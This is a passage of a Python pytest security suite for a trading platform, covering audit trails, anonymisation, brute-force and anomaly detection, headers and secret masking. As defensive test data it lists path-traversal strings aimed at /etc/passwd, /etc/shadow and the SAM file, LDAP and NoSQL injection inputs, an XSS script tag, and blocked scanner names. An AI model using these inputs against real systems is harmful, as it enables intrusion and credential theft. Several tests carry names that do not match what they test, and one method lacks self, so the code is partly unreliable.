            assert "hash" in audit_entry, "Integrity hash missing"

        # Verify audit trail integrity
        for i, entry in enumerate(audit_entries):
            if i > 0:
                # Each entry should reference previous entry's hash
                assert (
                    "previous_hash" in entry
                ), "Previous hash missing from audit chain"

        print(f"Audit trail test: {len(audit_entries)} entries created")

    def test_compliance_requirements(self, security_manager: Any) -> None:
        """Test compliance with data retention requirements."""
        # Create test data with different retention requirements
        data_types = [
            ("trade_records", 7 * 365),  # 7 years for trade records
            ("user_sessions", 90),  # 90 days for sessions
            ("api_logs", 365),  # 1 year for API logs
            ("error_logs", 30),  # 30 days for error logs
        ]

        for data_type, retention_days in data_types:
            # Test data within retention period
            recent_date = datetime.now(timezone.utc) - timedelta(
                days=retention_days // 2
            )
            should_retain = security_manager.should_retain_data(data_type, recent_date)
            assert should_retain, f"Recent {data_type} should be retained"

            # Test data beyond retention period
            old_date = datetime.now(timezone.utc) - timedelta(days=retention_days + 10)
            should_not_retain = security_manager.should_retain_data(data_type, old_date)
            assert (
                not should_not_retain
            ), f"Old {
                data_type} should not be retained"

    def test_data_anonymization(self, security_manager: Any) -> None:
        """Test data anonymization for compliance."""
        # Sample user data
        user_data = {
            "user_id": "user_12345",
            "email": "trader@example.com",
            "name": "John Doe",
            "phone": "+1-555-123-4567",
            "account_number": "1234567890",
            "trading_history": [
                {"symbol": "AAPL", "quantity": 100, "price": 150.0},
                {"symbol": "GOOGL", "quantity": 50, "price": 2500.0},
            ],
        }

        anonymized_data = security_manager.anonymize_user_data(user_data)

        # Verify PII is anonymized
        assert anonymized_data["email"] != user_data["email"], "Email not anonymized"
        assert anonymized_data["name"] != user_data["name"], "Name not anonymized"
        assert anonymized_data["phone"] != user_data["phone"], "Phone not anonymized"

        # Verify trading data structure is preserved
        assert len(list(anonymized_data["trading_history"])) == len(
            user_data["trading_history"]
        ), "Trading history structure changed"

        # Verify trading data values are preserved (for analysis)
        trading_history_anon: list[dict[str, Any]] = list(
            anonymized_data["trading_history"]
        )
        trading_history_orig: list[dict[str, Any]] = list(user_data["trading_history"])
        for orig, anon in zip(trading_history_orig, trading_history_anon):
            assert (
                orig["symbol"] == anon["symbol"]
            ), "Trading symbol changed during anonymization"
            assert orig["quantity"] == anon["quantity"], "Trading quantity changed"


@pytest.mark.security
class TestSecurityMonitoring:
    """Test security monitoring and alerting."""

    def test_csrf_protection(self, security_manager: Any) -> None:
        """Test detection of anomalous behavior."""
        user_id: str = "test_user"

        # Establish baseline behavior
        normal_activities = [
            {"action": "login", "timestamp": datetime.now(timezone.utc)},
            {"action": "view_portfolio", "timestamp": datetime.now(timezone.utc)},
            {"action": "place_order", "timestamp": datetime.now(timezone.utc)},
            {"action": "logout", "timestamp": datetime.now(timezone.utc)},
        ]

        for activity in normal_activities:
            security_manager.record_user_activity(user_id, **activity)

        # Test anomalous activities
        anomalous_activities: List[Dict[str, Any]] = [
            {"action": "bulk_order_placement", "count": 1000},  # Unusual volume
            {"action": "login", "location": "foreign_country"},  # Unusual location
            {"action": "api_access", "rate": 1000},  # High API rate
            {"action": "data_export", "volume": "1GB"},  # Large data export
        ]

        anomalies_detected = 0
        for activity in anomalous_activities:
            is_anomalous = security_manager.detect_anomaly(user_id, activity)
            if is_anomalous:
                anomalies_detected += 1

        assert (
            anomalies_detected >= 2
        ), f"Anomaly detection too lenient: {anomalies_detected}/4 detected"

    def test_brute_force_protection(self, security_manager: Any) -> None:
        """Test brute force attack detection."""
        client_ip = "192.168.1.100"

        # Simulate normal login attempts
        for i in range(3):
            result = security_manager.record_login_attempt(client_ip, success=True)
            assert not result["blocked"], f"Normal login {i} blocked"

        # Simulate failed login attempts (brute force)
        failed_attempts = 0
        for i in range(10):
            result = security_manager.record_login_attempt(client_ip, success=False)
            if result["blocked"]:
                failed_attempts = i + 1
                break

        assert (
            failed_attempts <= 5
        ), f"Brute force detection too lenient: {failed_attempts} attempts allowed"

        # Verify IP is blocked
        blocked_result = security_manager.record_login_attempt(client_ip, success=True)
        assert blocked_result["blocked"], "IP not blocked after brute force attempts"

        # Test unblocking after timeout
        with patch("time.time", return_value=time.time() + 3600):  # 1 hour later
            unblocked_result = security_manager.record_login_attempt(
                client_ip, success=True
            )
            assert not unblocked_result["blocked"], "IP not unblocked after timeout"

    def test_suspicious_pattern_detection(self, security_manager: Any) -> None:
        """Test detection of suspicious trading patterns."""
        user_id = "suspicious_trader"

        # Normal trading pattern
        normal_trades = [
            {"symbol": "AAPL", "quantity": 100, "price": 150.0},
            {"symbol": "GOOGL", "quantity": 50, "price": 2500.0},
            {"symbol": "MSFT", "quantity": 75, "price": 300.0},
        ]

        for trade in normal_trades:
            is_suspicious = security_manager.analyze_trading_pattern(user_id, trade)
            assert (
                not is_suspicious
            ), f"Normal trade flagged as suspicious: {
                trade}"

        # Suspicious trading patterns
        suspicious_trades = [
            {"symbol": "PUMP", "quantity": 10000, "price": 0.01},  # Pump and dump
            {
                "symbol": "AAPL",
                "quantity": 1000000,
                "price": 150.0,
            },  # Unusually large trade
            {"symbol": "AAPL", "quantity": 100, "price": 50.0},  # Unusual price
        ]

        suspicious_count = 0
        for trade in suspicious_trades:
            is_suspicious = security_manager.analyze_trading_pattern(user_id, trade)
            if is_suspicious:
                suspicious_count += 1

        assert (
            suspicious_count >= 2
        ), f"Suspicious pattern detection too lenient: {suspicious_count}/3"

    def test_security_monitoring(self, security_manager: Any) -> None:
        """Test monitoring of data access patterns."""
        user_id = "data_analyst"

        # Normal data access
        normal_accesses = [
            {"resource": "/api/v1/market-data", "count": 100},
            {"resource": "/api/v1/positions", "count": 10},
            {"resource": "/api/v1/trades", "count": 50},
        ]

        for access in normal_accesses:
            is_suspicious = security_manager.monitor_data_access(user_id, **access)
            assert not is_suspicious, f"Normal access flagged: {access}"

        # Suspicious data access
        suspicious_accesses = [
            {"resource": "/api/v1/users", "count": 1000},  # Mass user data access
            {"resource": "/api/v1/api-keys", "count": 100},  # API key enumeration
            {"resource": "/api/v1/audit-logs", "count": 5000},  # Audit log scraping
        ]

        suspicious_access_count = 0
        for access in suspicious_accesses:
            is_suspicious = security_manager.monitor_data_access(user_id, **access)
            if is_suspicious:
                suspicious_access_count += 1

        assert (
            suspicious_access_count >= 2
        ), f"Data access monitoring too lenient: {suspicious_access_count}/3"


@pytest.mark.security
class TestSecurityConfiguration:
    """Test security configuration and hardening."""

    def test_secure_defaults(self, security_manager: Any) -> None:
        """Test that secure defaults are enforced."""
        config = security_manager.get_security_config()

        # Verify secure defaults
        assert config["session_timeout"] <= 3600, "Session timeout too long"
        assert config["password_min_length"] >= 8, "Password minimum length too short"
        assert config["max_login_attempts"] <= 5, "Too many login attempts allowed"
        assert config["require_ssl"] is True, "SSL not required"
        assert config["api_rate_limit"] <= 1000, "API rate limit too high"

    def test_environment_security_settings(self, security_manager: Any) -> None:
        """Test security settings for different environments."""
        environments = ["development", "staging", "production"]

        for env in environments:
            env_config = security_manager.get_environment_security_config(env)

            if env == "production":
                # Production should have strictest security
                assert (
                    env_config["debug_mode"] is False
                ), "Debug mode enabled in production"
                assert (
                    env_config["log_level"] != "DEBUG"
                ), "Debug logging enabled in production"
                assert (
                    env_config["require_api_key"] is True
                ), "API key not required in production"

            elif env == "development":
                # Development can have relaxed settings
                assert (
                    env_config["debug_mode"] is True
                ), "Debug mode should be enabled in development"

    def test_security_headers(self, security_manager: Any) -> None:
        """Test security headers in API responses."""
        # Expected security headers
        expected_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy",
            "Referrer-Policy",
        ]

        security_headers = security_manager.get_security_headers()

        for header in expected_headers:
            assert (
                header in security_headers
            ), f"Missing security header: {
                header}"

        # Verify header values
        assert security_headers["X-Content-Type-Options"] == "nosniff"
        assert security_headers["X-Frame-Options"] == "DENY"
        assert "max-age=" in security_headers.get("Strict-Transport-Security", "")

    def test_ssl_tls_configuration(self, security_manager: Any) -> None:
        """Test CORS security configuration."""
        cors_config = security_manager.get_cors_config()

        # Verify secure CORS settings
        allowed_origins = cors_config.get("allowed_origins", [])
        assert "*" not in allowed_origins, "Wildcard CORS origin allowed"
        assert "null" not in allowed_origins, "Null origin allowed"

        # Verify allowed methods are limited
        allowed_methods = cors_config.get("allowed_methods", [])
        dangerous_methods = ["TRACE", "CONNECT"]
        for method in dangerous_methods:
            assert (
                method not in allowed_methods
            ), f"Dangerous HTTP method allowed: {method}"


@pytest.mark.security
class TestVulnerabilityScanning:
    """Test for common security vulnerabilities."""

    def test_directory_traversal_protection(self, security_manager: Any) -> None:
        """Test protection against directory traversal attacks."""
        file_requests = [
            "legitimate_file.txt",
            "../etc/passwd",
            "../../windows/system32/config/SAM",
            "....//....//etc/shadow",
            "/etc/hosts",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]

        for file_request in file_requests:
            is_safe = security_manager.validate_file_access(file_request)

            if any(
                pattern in file_request
                for pattern in ["..", "/etc/", "C:\\", "system32"]
            ):
                assert (
                    not is_safe
                ), f"Directory traversal not blocked: {
                    file_request}"
            else:
                assert (
                    is_safe
                ), f"Legitimate file access blocked: {
                    file_request}"

    def test_user_session_security(self, security_manager: Any) -> None:
        """Test protection against unsafe deserialization."""
        # Safe serialized data
        safe_data = {
            "symbol": "AAPL",
            "price": 150.25,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        safe_json = json.dumps(safe_data)

        deserialized_safe = security_manager.safe_deserialize(safe_json, "json")
        assert deserialized_safe == safe_data, "Safe deserialization failed"

        # Potentially unsafe serialized data (pickle)
        import pickle

        malicious_pickle = base64.b64encode(pickle.dumps("safe_string")).decode()

        # Should reject pickle deserialization
        with pytest.raises(SecurityError):
            security_manager.safe_deserialize(malicious_pickle, "pickle")

    def test_timing_attack_prevention(self, security_manager: Any) -> None:
        """Test prevention of timing attacks."""
        correct_password = "correct_password_123"
        wrong_passwords = [
            "wrong_password",
            "almost_correct_password_123",
            "c",  # Very short
            "x" * 100,  # Very long
        ]

        # Measure timing for correct password
        start_time = time.time()
        security_manager.constant_time_compare(correct_password, correct_password)
        correct_time = time.time() - start_time

        # Measure timing for wrong passwords
        wrong_times = []
        for wrong_password in wrong_passwords:
            start_time = time.time()
            security_manager.constant_time_compare(correct_password, wrong_password)
            wrong_time = time.time() - start_time
            wrong_times.append(wrong_time)

        # Verify timing is consistent (within reasonable variance)
        max_time_variance = max(wrong_times + [correct_time]) - min(
            wrong_times + [correct_time]
        )
        assert (
            max_time_variance < 0.01
        ), f"Timing variance too high: {max_time_variance:.6f}s"

    def test_injection_attack_prevention(self, security_manager: Any) -> None:
        """Test prevention of various injection attacks."""
        # LDAP injection
        ldap_injection_attempts = [
            "admin",
            "admin)(uid=*",
            "*)(uid=*))((|(",
            "admin)(&(password=*))",
        ]

        for ldap_attempt in ldap_injection_attempts:
            sanitized = security_manager.sanitize_ldap_input(ldap_attempt)
            assert (
                "(" not in sanitized
            ), f"LDAP injection not prevented: {
                ldap_attempt}"
            assert (
                ")" not in sanitized
            ), f"LDAP injection not prevented: {
                ldap_attempt}"
            assert (
                "*" not in sanitized
            ), f"LDAP injection not prevented: {
                ldap_attempt}"

        # NoSQL injection
        nosql_injection_attempts: List[Dict[str, Any]] = [
            {"$ne": None},
            {"$gt": ""},
            {"$where": "this.password.length > 0"},
            {"$regex": ".*"},
        ]

        for nosql_attempt in nosql_injection_attempts:
            is_safe = security_manager.validate_nosql_input(nosql_attempt)
            assert (
                not is_safe
            ), f"NoSQL injection not prevented: {
                nosql_attempt}"


@pytest.mark.security
class TestSecretManagement:
    """Test secure management of secrets and credentials."""

    def test_environment_variable_security(self, security_manager: Any) -> None:
        """Test secure handling of environment variables."""
        # Test that sensitive environment variables are not logged
        sensitive_env_vars = [
            "DB_PASSWORD",
            "REDIS_PASSWORD",
            "ALPACA_SECRET_KEY",
            "GOTIFY_TOKEN",
            "JWT_SECRET",
        ]

        for env_var in sensitive_env_vars:
            # Set test value
            test_value = f"secret_value_for_{env_var}"
            os.environ[str(env_var)] = test_value

            # Verify value is masked in logs
            log_safe_value = security_manager.get_log_safe_env_var(env_var)
            assert (
                log_safe_value != test_value
            ), f"Environment variable not masked: {env_var}"
            assert (
                "*" in log_safe_value or "X" in log_safe_value
            ), f"No masking applied to: {env_var}"

            # Clean up
            del os.environ[env_var]

    def test_api_key_creation(api_key_manager: Any) -> None:
        """Test API key rotation mechanisms."""
        service_name = "test_service"

        # Generate initial key
        old_key = api_key_manager.generate_api_key(service_name)
        assert api_key_manager.validate_api_key(old_key), "Initial key invalid"

        # Rotate key
        new_key = api_key_manager.rotate_api_key(service_name)
        assert new_key != old_key, "Key not rotated"
        assert api_key_manager.validate_api_key(new_key), "New key invalid"

        # Old key should be invalidated (after grace period)
        time.sleep(0.1)  # Simulate grace period
        api_key_manager.invalidate_old_keys()
        assert not api_key_manager.validate_api_key(old_key), "Old key not invalidated"

    def test_secure_configuration_storage(self, security_manager: Any) -> None:
        """Test secure storage of configuration data."""
        sensitive_config = {
            "database_url": "postgresql://user:password@host:5432/db",
            "redis_url": "redis://user:password@host:6379",
            "api_endpoints": {
                "broker": "https://api.broker.com",
                "data_provider": "https://data.provider.com",
            },
            "encryption_keys": {"master_key": "super_secret_master_key"},
        }

        # Store configuration securely
        config_id = security_manager.store_secure_config(sensitive_config)
        assert config_id, "Configuration not stored"

        # Retrieve configuration
        retrieved_config = security_manager.retrieve_secure_config(config_id)
        assert retrieved_config == sensitive_config, "Configuration retrieval failed"

        # Verify config is encrypted at rest
        raw_stored_config = security_manager.get_raw_stored_config(config_id)
        assert raw_stored_config != json.dumps(
            sensitive_config
        ), "Configuration not encrypted at rest"


@pytest.mark.security
class TestNetworkSecurityTests:
    """Test network-level security measures."""

    def test_password_policy_enforcement(self, security_manager: Any) -> None:
        """Test IP address whitelist enforcement."""
        # Allowed IPs
        allowed_ips = ["192.168.1.100", "10.0.0.50", "172.16.0.25"]

        for ip in allowed_ips:
            assert security_manager.is_ip_allowed(ip), f"Allowed IP rejected: {ip}"

        # Blocked IPs
        blocked_ips = [
            "1.2.3.4",  # External IP
            "192.168.2.100",  # Different subnet
            "127.0.0.1",  # Localhost (if not in whitelist)
            "0.0.0.0",  # Invalid IP
        ]

        for ip in blocked_ips:
            assert not security_manager.is_ip_allowed(ip), f"Blocked IP accepted: {ip}"

    def test_request_size_limits(self, security_manager: Any) -> None:
        """Test request size limits to prevent DoS."""
        # Normal request size
        normal_request = {"data": "A" * 1000}  # 1KB
        assert security_manager.validate_request_size(
            json.dumps(normal_request)
        ), "Normal request rejected"

        # Large request
        large_request = {"data": "A" * (10 * 1024 * 1024)}  # 10MB
        assert not security_manager.validate_request_size(
            json.dumps(large_request)
        ), "Large request accepted"

    def test_permission_validation(self, security_manager: Any) -> None:
        """Test User-Agent header validation."""
        # Valid user agents
        valid_user_agents = [
            "TradingSystem/1.0",
            "Mozilla/5.0 (compatible; TradingBot/2.0)",
            "curl/7.68.0",
            "PostmanRuntime/7.26.8",
        ]

        for user_agent in valid_user_agents:
            assert security_manager.validate_user_agent(
                user_agent
            ), f"Valid user agent rejected: {user_agent}"

        # Suspicious user agents
        suspicious_user_agents = [
            "",  # Empty
            "sqlmap/1.0",  # Security tool
            "nikto/2.1.5",  # Vulnerability scanner
            '<script>alert("xss")</script>',  # XSS attempt
            "A" * 1000,  # Extremely long
        ]

        for user_agent in suspicious_user_agents:
            assert not security_manager.validate_user_agent(
                user_agent
            ), f"Suspicious user agent accepted: {user_agent}"


@pytest.mark.security
@pytest.mark.slow
class TestSecurityStressTesting:
    """Test security under stress conditions."""

    async def test_concurrent_authentication_stress(
        self, security_manager: Any
    ) -> None:
        """Test authentication system under concurrent load."""
        concurrent_users = 100
        attempts_per_user = 50

        async def authentication_worker(user_id: int) -> int:
            """Worker function for concurrent authentication."""
            success_count = 0
            for attempt in range(attempts_per_user):
                # Mix of valid and invalid credentials
                is_valid = attempt % 3 == 0  # Every 3rd attempt is valid

                if is_valid:
                    token = security_manager.create_session(f"user_{user_id}")
                    if security_manager.validate_session(token):
                        success_count += 1
                else:
                    # Invalid authentication attempt
                    fake_token = f"invalid_token_{user_id}_{attempt}"
                    security_manager.validate_session(fake_token)

            return success_count

        # Run concurrent authentication
        start_time = time.time()
        tasks = [authentication_worker(user_id) for user_id in range(concurrent_users)]
        results = await asyncio.gather(*tasks)
        duration = time.time() - start_time

        total_successes = sum(results)
        total_attempts = concurrent_users * attempts_per_user
        success_rate = total_successes / (
            concurrent_users * (attempts_per_user // 3)  # Only valid attempts
        )

        # Verify system handled load
        assert (
            success_rate > 0.9
        ), f"Authentication success rate too low under load: {success_rate * 100:.1f}%"
        assert (
            total_attempts > 0
        ), f"No authentication attempts made: {
            total_attempts}"
        assert (
            duration < 60
        ), f"Authentication stress test took too long: {duration:.2f}s"

        print(
            f"Authentication stress test: {
                success_rate * 100:.1f}% success rate in {duration:.2f}s"
        )

    async def test_rate_limiting_under_load(self, security_manager: Any) -> None:
        """Test rate limiting effectiveness under high load."""
        client_ips = [f"192.168.1.{i}" for i in range(10, 60)]  # 50 different IPs

        async def rate_limit_worker(client_ip: str) -> Dict[str, int]:
            """Worker that hammers rate limits."""
            successful_requests = 0
            blocked_requests = 0

            for request_num in range(200):  # High request volume
                result = security_manager.check_rate_limit(client_ip)
                if result:
                    successful_requests += 1
                else:
                    blocked_requests += 1

                # Small delay to avoid overwhelming
                await asyncio.sleep(0.001)

            return {"successful": successful_requests, "blocked": blocked_requests}

        # Run rate limiting test
        tasks = [rate_limit_worker(ip) for ip in client_ips]
        results = await asyncio.gather(*tasks)

        # Analyze results
        total_successful = sum(r["successful"] for r in results)
        total_blocked = sum(r["blocked"] for r in results)
        block_rate = total_blocked / (total_successful + total_blocked)

        # Rate limiting should kick in
        assert (
            block_rate > 0.5
        ), f"Rate limiting not effective: {block_rate * 100:.1f}% blocked"

        print(f"Rate limiting test: {block_rate * 100:.1f}% requests blocked")


# Exception class for security tests
class SecurityError(Exception):
    """Security-related error for testing."""

    pass


if __name__ == "__main__":
    # Run security tests standalone
    import pytest

    test_args = ["-v", "-m", "security", "--tb=short", os.path.dirname(__file__)]

    print("Running security tests...")
    exit_code = pytest.main(test_args)

    if exit_code == 0:
        print("✅ All security tests passed!")
    else:
        print(f"❌ Some security tests failed (exit code: {exit_code})")
